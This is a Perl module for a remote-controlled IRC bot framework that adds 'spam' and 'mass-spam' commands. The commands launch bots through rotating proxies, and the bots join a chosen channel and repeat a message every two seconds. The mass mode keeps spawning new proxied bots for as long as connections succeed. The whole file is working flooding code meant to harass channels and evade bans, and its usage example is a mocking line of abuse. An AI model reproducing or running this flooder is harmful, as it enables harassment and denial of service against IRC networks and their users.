# This is a very basic flooder personality. Adds the commands "spam" and "mass-spam"

package IRC::RemoteControl::Personality::Flood;

use Moose::Role;
use AnyEvent;

# register spam and mass-spam commands
after 'setup' => sub {
    my ($self) = @_;

    $self->register_command('spam' => \&spam_cmd_handler);
    $self->register_command('mass-spam' => \&spam_cmd_handler);
};

# join channel after registering
after 'registered' => sub {
    my ($self, $conn) = @_;

    $conn->{flood_register_handler}->($self, $conn);
};


sub spam_cmd_handler {
    my ($self, $h, $cmd, $args) = @_;

    my ($mass, $chan, $text) = "$cmd $args" =~ /^(mass-)?spam(?:\s+(#\S+)\s+(.+))/i;
    unless ($chan && $text) {
        return $h->push_write("Usage: spam #anxious MAN IN A DRESS HERE\n");
    }

    my $conn;
    if ($mass) {
        $conn = $self->mass_spam($chan, $text);
    } else {
        $conn = $self->spam($chan, $text);
    }
}

sub mass_spam {
    my ($self, $chan, $text) = @_;
    
    while (my $conn = $self->spam($chan, $text)) {
        $self->h->push_write("Spamming $chan\n");
    }
}

# connect one bot and spam
sub spam {
    my ($self, $chan, $text) = @_;
    
    my $proxy = $self->get_random_proxy;
    my $conn = $self->connect($chan, $text, $proxy);
    return unless $conn;

    $conn->{flood_register_handler} = sub {
        my ($self, $conn) = @_;

        $conn->{flood_text}{$chan} = $text;

        # join channel
        $conn->send_msg(JOIN => $chan);
    };

    return $conn;
}

# connection joined channel
after 'joined' => sub {
    my ($self, $conn, $nick, $chan, $is_me) = @_;

    return unless $is_me;
    #$conn->send_long_message(undef, 0, "PRIVMSG\001ACTION", $chan, $text);

    my $text = $conn->{flood_text}{$chan} or return;

    $conn->{flood_timer} = AnyEvent->timer(
        after => 0.0,
        interval => 2.0,
        cb => sub {
            $conn->{flood_repeat_count}{$chan} ||= 0;

            if ($conn->{flood_repeat_count}{$chan}++ >= $self->repeat_count) {
                delete $conn->{flood_timer};
                delete $conn->{flood_repeat_count}{$chan};
                $conn->disconnect;
            } else {
                $conn->send_long_message('utf-8', 0, "PRIVMSG", $chan, $text);
                #$conn->send_long_message(undef, 0, "PRIVMSG\001ACTION", $chan, $text);
            }
        },
    );

};

1;
